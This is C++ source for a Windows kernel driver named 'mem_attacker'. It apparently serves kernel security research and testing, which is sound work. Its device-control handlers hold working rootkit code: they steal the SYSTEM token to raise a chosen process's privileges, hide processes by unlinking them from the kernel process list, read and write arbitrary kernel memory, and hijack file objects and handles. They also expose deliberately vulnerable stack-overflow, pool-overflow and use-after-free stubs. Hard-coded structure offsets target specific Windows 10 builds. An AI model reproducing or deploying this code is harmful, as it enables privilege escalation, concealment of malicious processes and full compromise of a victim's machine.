// Copyright (c) 2015-2016, tandasat. All rights reserved.
// Use of this source code is governed by a MIT-style license that can be
// found in the LICENSE file.

/// @file
/// Implements an entry point of the driver.

#ifndef POOL_NX_OPTIN
#define POOL_NX_OPTIN 1
#endif
#include "mem_attacker_driver.h"


extern "C" {
////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//

////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

////////////////////////////////////////////////////////////////////////////////
//
// types
//

////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

DRIVER_INITIALIZE DriverEntry;

static DRIVER_UNLOAD DriverpDriverUnload;

_IRQL_requires_max_(PASSIVE_LEVEL) static void DriverpDriverUnload(PDRIVER_OBJECT driver_object);

_IRQL_requires_max_(PASSIVE_LEVEL) bool DriverpIsSuppoetedOS();

_IRQL_requires_max_(PASSIVE_LEVEL) void DriverAttackerRemoveSymbolLink(PWCHAR linkName);

_IRQL_requires_max_(PASSIVE_LEVEL) void DriverAttackerRemoveControlDevice(PDRIVER_OBJECT driver_object);

_Use_decl_annotations_ NTSTATUS DriverAttackerpCreateClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp);

_Use_decl_annotations_ static NTSTATUS DriverAttackerpReadWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP  Irp);

_Use_decl_annotations_ static void DriverAttackerpIrpReadParameters(IN PIRP pIrp,
  OUT PVOID &inBuf, OUT ULONG &inBufSize,
  OUT PVOID &outBuf, OUT ULONG &outBufSize);

NTSTATUS DriverAttackerpInitGlobalVariable();

void SecurRemoveEntryList(_In_ PLIST_ENTRY Entry);

void hide_proc(const ULONG64 targetPID);

void set_privs(const ULONG64 targetPID);

_Use_decl_annotations_ static NTSTATUS DriverAttackerpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

_Use_decl_annotations_ bool DriverpIsSuppoetedOS();

_Use_decl_annotations_ NTSTATUS DriverAttackerpCreateDevice(
  IN PDRIVER_OBJECT pDrv, 
  ULONG uFlags, 
  PWCHAR devName, 
  PWCHAR linkName);



#if defined(ALLOC_PRAGMA)
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(INIT, DriverpIsSuppoetedOS)
#pragma alloc_text(INIT, DriverAttackerpInitGlobalVariable)

// #pragma alloc_text(PAGE, DriverpDriverUnload)
// #pragma alloc_text(PAGE, DriverAttackerRemoveSymbolLink)
// #pragma alloc_text(PAGE, DriverAttackerRemoveControlDevice)
// #pragma alloc_text(PAGE, DriverAttackerpCreateClose)
// #pragma alloc_text(PAGE, DriverAttackerpReadWrite)
// #pragma alloc_text(PAGE, DriverAttackerpIrpReadParameters)
// 
// #pragma alloc_text(PAGE, SecurRemoveEntryList)
// #pragma alloc_text(PAGE, hide_proc)
// #pragma alloc_text(PAGE, set_privs)
// #pragma alloc_text(PAGE, copy_fileobj_fields)
// #pragma alloc_text(PAGE, ExUnlockHandleTableEntry)
// #pragma alloc_text(PAGE, walkthrough_handle_table_and_patch)
// #pragma alloc_text(PAGE, DriverAttackerpGetObjectHeaderByHandle)
// #pragma alloc_text(PAGE, DriverAttackerpHijackHandleTable)
// #pragma alloc_text(PAGE, DriverAttackerpDeviceControl)
// #pragma alloc_text(PAGE, DriverAttackerpCreateDevice)



#endif

////////////////////////////////////////////////////////////////////////////////
//
// variables
//

////////////////////////////////////////////////////////////////////////////////
//
// implementations
//



void DriverAttackerRemoveSymbolLink(PWCHAR linkName){
	UNICODE_STRING device_link;
	RtlInitUnicodeString(&device_link, linkName);
	IoDeleteSymbolicLink(&device_link);
}

void DriverAttackerRemoveControlDevice(PDRIVER_OBJECT driver_object) {
	PDEVICE_OBJECT device_object = driver_object->DeviceObject;
	while (device_object){
		IoDeleteDevice(device_object);
		device_object = device_object->NextDevice;
	}
}

// Unload handler
_Use_decl_annotations_ static void DriverpDriverUnload(
    PDRIVER_OBJECT driver_object) {
  UNREFERENCED_PARAMETER(driver_object);
  PAGED_CODE();

  DriverAttackerRemoveSymbolLink(MEM_ATTACKER_LINKNAME_APP);
  DriverAttackerRemoveControlDevice(driver_object);

  MEM_ATTACKER_LOGGER("The driver has been unloaded, bye.",);
}

// Create-Close handler
_Use_decl_annotations_ NTSTATUS DriverAttackerpCreateClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP  Irp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	PAGED_CODE();

	const auto stack = IoGetCurrentIrpStackLocation(Irp);
	switch (stack->MajorFunction) {
		case IRP_MJ_CREATE: break;
		case IRP_MJ_CLOSE: break;
	}
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}


// Read Write handler
_Use_decl_annotations_ static NTSTATUS DriverAttackerpReadWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP  Irp){
	PAGED_CODE();

	PVOID buf = NULL;
	auto buf_size = 0;
	// Read size of input buffer 
	const auto stack = IoGetCurrentIrpStackLocation(Irp);
	switch (stack->MajorFunction){
		case IRP_MJ_READ: buf_size = stack->Parameters.Read.Length; break;
		case IRP_MJ_WRITE: buf_size = stack->Parameters.Write.Length; break;
	}
	// Get the address of input buffer
	if (buf_size){
		if (pDeviceObject->Flags & DO_BUFFERED_IO) {
			buf = Irp->AssociatedIrp.SystemBuffer;
		}
		else if (pDeviceObject->Flags & DO_DIRECT_IO) {
			buf = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
		}
		else {
			buf = Irp->UserBuffer;
		}
	}

	// Do nothing and complete request
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

_Use_decl_annotations_ static void DriverAttackerpIrpReadParameters(IN PIRP pIrp, 
	OUT PVOID &inBuf, OUT ULONG &inBufSize, 
	OUT PVOID &outBuf, OUT ULONG &outBufSize){
	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
	inBufSize = stack->Parameters.DeviceIoControl.InputBufferLength;
	outBufSize = stack->Parameters.DeviceIoControl.OutputBufferLength;
	const auto method = stack->Parameters.DeviceIoControl.IoControlCode & 0x03L;
	switch (method)
	{
	case METHOD_BUFFERED:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = pIrp->AssociatedIrp.SystemBuffer;
		break;
	case METHOD_IN_DIRECT:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
		break;
	case METHOD_OUT_DIRECT:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
		break;
	case METHOD_NEITHER:
		inBuf = stack->Parameters.DeviceIoControl.Type3InputBuffer;
		outBuf = pIrp->UserBuffer;
		break;
	}
}

//////////////////////////////////////////////////////////////////////////

EPROC_OFFSETS g_EprocOffsets = { 0 }; 

NTSTATUS DriverAttackerpInitGlobalVariable() {
	NTSTATUS nt_status = STATUS_NOT_SUPPORTED;

	switch (*NtBuildNumber) {
  case 14393: /* Win10_1607_SingleLang_English_x64 */
              /*  BUILDOSVER_STR:  10.0.14393.0.amd64fre.rs1_release.160715-1616  */
    g_EprocOffsets.UniqueProcessId = 0x2e8;
    g_EprocOffsets.ActiveProcessLinks = 0x2f0;
    g_EprocOffsets.Token = 0x358;
    g_EprocOffsets.ObjectTable = 0;
    nt_status = STATUS_NOT_SUPPORTED;
    break;
  case 15063: /*   */
              /* BUILDOSVER_STR:  10.0.15063.0.amd64fre.rs2_release.170317-1834 */
    g_EprocOffsets.UniqueProcessId = 0x2e0;
    g_EprocOffsets.ActiveProcessLinks = 0x2e8;
    g_EprocOffsets.Token = 0x358;
    g_EprocOffsets.ObjectTable = 0;
    nt_status = STATUS_NOT_SUPPORTED;
    break;
	case 16299: /*   */
				/* BUILDOSVER_STR:  10.0.16299.15.amd64fre.rs3_release.170928-1534 */
		g_EprocOffsets.UniqueProcessId = 0x2e0;
		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
		g_EprocOffsets.Token = 0x358;
    g_EprocOffsets.ObjectTable = 0;
		nt_status = STATUS_NOT_SUPPORTED;
		break;
	case 17763:	/*   Windows 10 Win10_1809Oct_v2_English_x64 */
				/*   BUILDOSVER_STR:  10.0.17763.1.amd64fre.rs5_release.180914-1434   */
		g_EprocOffsets.UniqueProcessId = 0x2e0;
		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
		g_EprocOffsets.Token = 0x358;
    g_EprocOffsets.ObjectTable = 0;
		nt_status = STATUS_NOT_SUPPORTED;
		break;
  case 18362:	/*   Windows 10 Kernel Version 18362 MP (1 procs) Free x64 */
              /*   BUILDOSVER_STR:  10.0.18362.1.amd64fre.19h1_release.190318-1202   */
    g_EprocOffsets.UniqueProcessId = 0x2e8;
    g_EprocOffsets.ActiveProcessLinks = 0x2f0;
    g_EprocOffsets.Token = 0x360;
    g_EprocOffsets.ObjectTable = 0x418;
    nt_status = STATUS_SUCCESS;
    break;
  case 18990:   /*   Windows 10 Kernel Version 18990 MP (1 procs) Free x64 */
                /*   Built by: 18990.1.amd64fre.vb_release.190921-1704  */
                /*   BUILDOSVER_STR:  10.0.18990.1.amd64fre.vb_release.190921-1704  */
    g_EprocOffsets.UniqueProcessId = 0x440;
    g_EprocOffsets.ActiveProcessLinks = 0x448;
    g_EprocOffsets.Token = 0x4b8;
    g_EprocOffsets.ObjectTable = 0x570;
    nt_status = STATUS_SUCCESS;
    break;

	default:
		g_EprocOffsets = { 0 };
		nt_status = STATUS_NOT_SUPPORTED;
		break;
	};
	return nt_status;
}

void SecurRemoveEntryList(_In_ PLIST_ENTRY Entry){
	if (Entry){
		PLIST_ENTRY PrevEntry = Entry->Blink;
		PLIST_ENTRY NextEntry = Entry->Flink;;
		if (NextEntry && PrevEntry) {
			if ((NextEntry->Blink != Entry) || 
				(PrevEntry->Flink != Entry)) {
				FatalListEntryError((PVOID)PrevEntry,
					(PVOID)Entry,
					(PVOID)NextEntry);
			}
			PrevEntry->Flink = NextEntry;
			NextEntry->Blink = PrevEntry;
		}
	}
}

void hide_proc(const ULONG64 targetPID) {
	PEPROCESS target_proc = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
		MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);

		SecurRemoveEntryList((PLIST_ENTRY)((char*)target_proc + g_EprocOffsets.ActiveProcessLinks));

		MEM_ATTACKER_LOGGER("has unlinked the struct to hide process %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		DbgPrint("\r\n\r\n");

		if (target_proc) {
			ObDereferenceObject(target_proc);
		}
	}
	return;

// 	PLIST_ENTRY current_apl = (PLIST_ENTRY)((char*)PsInitialSystemProcess + g_EprocOffsets.ActiveProcessLinks);
// 	const PLIST_ENTRY begin_apl = current_apl;
// 
// 	ULONG64 curret_pid = 0;
// 	do {
// 		curret_pid = *(ULONG64*)((char*)current_apl -
// 			g_EprocOffsets.ActiveProcessLinks +
// 			g_EprocOffsets.UniqueProcessId);
// 		if (targetPID == curret_pid) {
// 			MEM_ATTACKER_LOGGER("founds the EPROCESS struct for the %s:%d,",
// 				PsGetProcessImageFileName((PEPROCESS)((char*)current_apl - g_EprocOffsets.ActiveProcessLinks)),
// 				targetPID);
// 			SecurRemoveEntryList(current_apl);
// 			MEM_ATTACKER_LOGGER("unlinks the struct to hide process %s:%d.",
// 				PsGetProcessImageFileName((PEPROCESS)((char*)current_apl - g_EprocOffsets.ActiveProcessLinks)),
// 				targetPID);
// 			DbgPrint("\r\n\r\n");
// 			break;
// 		}
// 		current_apl = current_apl->Flink;
// 	} while (begin_apl != current_apl);
}

void set_privs(const ULONG64 targetPID) {
	
	ULONG64 system_token = *(ULONG64*)((char*)PsInitialSystemProcess + g_EprocOffsets.Token);
		
	PEPROCESS target_proc = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
		MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		__try {
			*(ULONG64*)((char*)target_proc + g_EprocOffsets.Token) = system_token;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {   };
		MEM_ATTACKER_LOGGER("has set the highest privileges to the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		DbgPrint("\r\n\r\n");

		if (target_proc) {
			ObDereferenceObject(target_proc);
		}
	}
}

// IOCTL dispatch handler
_Use_decl_annotations_ static NTSTATUS DriverAttackerpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	PAGED_CODE();
    static zwfile::FileWriter fw_open_file;
	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
	PVOID in_buf = NULL, out_buf = NULL;
	ULONG in_buf_sz = 0, out_buf_sz = 0;
	auto status = STATUS_INVALID_PARAMETER;
	ULONG_PTR info = 0;
	DriverAttackerpIrpReadParameters(pIrp, in_buf, in_buf_sz, out_buf, out_buf_sz);
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case MEM_ATTACKER_TOKEN_STEALING:
		if (in_buf_sz == sizeof ULONG64) {
			ULONG64 pid = 0;
			ULONG64* pdata = (ULONG64*)in_buf;
			__try {
				pid = *pdata;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) { pid = 0; }
			if (pid) {
				set_privs(pid);
			}
		}
		break;

	case MEM_ATTACKER_HIDE_PROCESS:
		if (in_buf_sz == sizeof ULONG64) {
			ULONG64 pid = 0;
			ULONG64* pdata = (ULONG64*)in_buf;
			__try {
				pid = *pdata;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) { pid = 0; }
			if (pid) {
				hide_proc(pid);
			}
		}
		break;

	case MEM_ATTACKER_READ_1_BYTE:
		if (in_buf_sz == sizeof ADDR_BYTE) {
			ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
      bool b_res = false;
      if (pdata->addr && MmIsAddressValid((void*)pdata->addr)) {
        __try {
         pdata->value = *(char*)pdata->addr;
         b_res = true;
         MEM_ATTACKER_LOGGER("reads 1 byte %01X from the memory addr 0x%I64X.",
           pdata->value, pdata->addr);
         DbgPrint("\r\n\r\n");
        }
        __except (EXCEPTION_EXECUTE_HANDLER)   {   b_res = false;   }
      }
      if (!b_res) { MEM_ATTACKER_LOGGER("the input address  0x%I64X  is not valid.", pdata->addr); }
		}
		break;

	case MEM_ATTACKER_WRITE_1_BYTE:
		if (in_buf_sz == sizeof ADDR_BYTE) {
			ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
      bool b_res = false;
      if (pdata->addr && MmIsAddressValid((void*)pdata->addr)) {
        __try {
          *(char*)pdata->addr = pdata->value;
          b_res = true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)   {   b_res = false;   }
        MEM_ATTACKER_LOGGER("writes 1 byte %01X to the memory addr 0x%I64X.",
          pdata->value, pdata->addr);
        DbgPrint("\r\n\r\n");
      }
      if (!b_res) { MEM_ATTACKER_LOGGER("the input address  0x%I64X  is not valid.", pdata->addr); }
		}
		break;

	case MEM_ATTACKER_READ_CHAR_DATA:
		if (in_buf_sz == sizeof ALLOCATED_DATA) {
			ALLOCATED_DATA *data = (ALLOCATED_DATA*)in_buf;
			if (data && data->address && data->content) {
				RtlCopyMemory(data->content, data->address, sizeof data->content);
				MEM_ATTACKER_LOGGER("reads  \"%s\"  from the memory 0x%I64X.", data->content, data->address);
			}
		}
		break;

	case MEM_ATTACKER_WRITE_CHAR_DATA:
		if (in_buf_sz == sizeof ALLOCATED_DATA) {
			ALLOCATED_DATA *data = (ALLOCATED_DATA*)in_buf;
			if (data && data->address && data->content) {
				RtlCopyMemory(data->address, data->content, sizeof data->content);
				MEM_ATTACKER_LOGGER("writes  \"%s\"  to the memory 0x%I64X.", data->content, data->address);
			}
		}
		break;
	//////////////////////////////////////////////////////////////////////////

	case MEM_ATTACKER_CREATE_FILE:	zwfile::zw_create_file(in_buf_sz, in_buf); break;

	case MEM_ATTACKER_OPEN_ONLY:  files_hijacking::HijAttOpenFile(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz);  break;

	case MEM_ATTACKER_READ_FILE:  files_hijacking::HijAttReadFile(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz); break;

	case MEM_ATTACKER_WRITE_FILE:  files_hijacking::HijAttWriteFile(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz);  break;

	case MEM_ATTACKER_CLOSE_FILE:  files_hijacking::HijAttCloseFile(fw_open_file);  break;

	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ:
        files_hijacking::HijAttOpenFileByHijackkingFileObj(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz);
        break;

    case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ_INTERNALS:
        files_hijacking::HijAttOpenFileByHijackingFileObjInternals(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz);
        break;

	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEHANDLE:
        files_hijacking::HijAttOpenFileByHijackkingFileHandle(fw_open_file, in_buf, in_buf_sz, out_buf, out_buf_sz);
		break;

	case MEM_ATTACKER_HIJACK_PRIVS:
		if (in_buf_sz == sizeof HIJACK_PRIVS_DATA){
			PHIJACK_PRIVS_DATA p_data = (PHIJACK_PRIVS_DATA)in_buf;
			if (p_data && p_data->processID){
				p_data->is_privs_hijacking_ok = 
					token_hijacking::hijacking(p_data->processID);
			}
		}
		break;

	//////////////////////////////////////////////////////////////////////////
	case MEM_ATTACKER_WRITE_8_BYTES:
		if (in_buf_sz == sizeof ADDR_8BYTES) {
			ADDR_8BYTES* pdata = (ADDR_8BYTES*)in_buf;
			__try {
				*(ULONG64*)pdata->addr = pdata->value;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {   }
			MEM_ATTACKER_LOGGER("writes 8 bytes %08X to memory 0x%I64X.",
				pdata->value, pdata->addr);
			DbgPrint("\r\n\r\n");
		}
		break;
	case MEM_ATTACKER_SIMPLE_STACK_OVERFLOW:
		status = vulnerable_code::stack_overflow_stub(in_buf, in_buf_sz);
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_SIMPLE_POOL_OVERFLOW:
		status = vulnerable_code::pool_overflow_stub(in_buf, in_buf_sz);
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_ALLOCATE_OBJECT:
		status = vulnerable_code::uaf_allocate_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_FREE_OBJECT:
		status = vulnerable_code::uaf_free_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_USE_OBJECT:
		status = vulnerable_code::uaf_use_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_ALLOCATE_FAKE:
		status = vulnerable_code::uaf_allocate_fake_stub(in_buf);
		info = in_buf_sz;
		break;
	default: {}
	}

	pIrp->IoStatus.Information = info;
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// Test if the system is one of supported OS versions
_Use_decl_annotations_ bool DriverpIsSuppoetedOS() {
  PAGED_CODE();

  RTL_OSVERSIONINFOW os_version = {};
  auto status = RtlGetVersion(&os_version);
  if (!NT_SUCCESS(status)) {
    return false;
  }

  if (os_version.dwBuildNumber != 15063){
	  return false;
  }

  // 4-gigabyte tuning (4GT) should not be enabled
  if (!IsX64() &&
      reinterpret_cast<ULONG_PTR>(MmSystemRangeStart) != 0x80000000) {
    return false;
  }
  return true;
}

_Use_decl_annotations_ NTSTATUS DriverAttackerpCreateDevice(IN PDRIVER_OBJECT pDrv, ULONG uFlags, PWCHAR devName, PWCHAR linkName)
{
	UNICODE_STRING dev_name = { 0 }, link_name = {0};
	RtlInitUnicodeString(&dev_name, devName);
	RtlInitUnicodeString(&link_name, linkName);

	PDEVICE_OBJECT pDev;
	auto status = IoCreateDevice(pDrv, 0 /* or sizeof(DEVICE_EXTENSION)*/, &dev_name, 65500, 0, 0, &pDev);

	if (NT_SUCCESS(status)) {
		pDev->Flags |= uFlags;
		IoDeleteSymbolicLink(&link_name);
		status = IoCreateSymbolicLink(&link_name, &dev_name);
	}
	else   {   IoDeleteDevice(pDev);   }

	return status;
}

// #include "intrin.h"
// static const unsigned long SMEP_MASK = 0x100000;
// 
// void print_smep_status() {
// 	bool b_active = false;
// 	KAFFINITY active_processors = KeQueryActiveProcessors();
// 	for (KAFFINITY current_affinity = 1; active_processors; current_affinity <<= 1) {
// 		if (active_processors & current_affinity) {
// 			active_processors &= ~current_affinity;
// 			KeSetSystemAffinityThread(current_affinity);
// 			b_active = (0 != (__readcr4() & SMEP_MASK));
// 
// 			MEM_ATTACKER_LOGGER("%s on CPU %d \r\n",
// 				b_active ? "SMEP is active" : "SMEP has been disabled",
// 				KeGetCurrentProcessorNumber() );
// 		}
// 	}
// }

// A driver entry point
_Use_decl_annotations_ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object,
	PUNICODE_STRING registry_path) {
	UNREFERENCED_PARAMETER(registry_path);
	PAGED_CODE();
	
	MEM_ATTACKER_LOGGER("has been loaded to the %I64X-%I64X ",
		driver_object->DriverStart, (char*)driver_object->DriverStart+ driver_object->DriverSize);

	if (!NT_SUCCESS(DriverAttackerpInitGlobalVariable())){
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	// Test if the system is supported
// 	if (!DriverpIsSuppoetedOS()) {
// 		return STATUS_CANCELLED;
// 	}

//	print_smep_status();

	driver_object->DriverUnload = DriverpDriverUnload;
	driver_object->MajorFunction[IRP_MJ_CREATE] =
	driver_object->MajorFunction[IRP_MJ_CLOSE] = DriverAttackerpCreateClose;
	driver_object->MajorFunction[IRP_MJ_READ] =
	driver_object->MajorFunction[IRP_MJ_WRITE] = DriverAttackerpReadWrite;
	driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverAttackerpDeviceControl;

  auto nt_status = DriverAttackerpCreateDevice(driver_object, NULL, MEM_ATTACKER_DEVICENAME_DRV, MEM_ATTACKER_LINKNAME_DRV);

	return nt_status;
}

}  // extern "C"
